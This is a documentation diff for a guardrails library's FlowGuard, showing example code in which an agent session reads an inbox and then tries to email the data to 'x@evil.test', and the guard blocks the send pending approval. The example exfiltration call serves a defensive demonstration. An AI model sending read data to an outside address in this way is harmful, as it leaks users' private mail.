@@ -154,8 +154,8 @@ tools:
 from theaios.guardrails.flow import FlowGuard
 
 guard = FlowGuard(policy)
-guard.call(session, "read_inbox", read_inbox)                 # session is now tainted
-guard.call(session, "send_email", send_email, to="x@evil.test", body=data)
+guard.call(session, "read_inbox", read_inbox)                     # session is now tainted
+guard.call(session, "send_email", send_email, {"to": "x@evil.test", "body": data})
 # FlowBlocked: send_email: waiting for approval (proposal 3f2a...): the session read
 # untrusted content (read_inbox); a send needs approval; the session read sensitive data ...
 ```
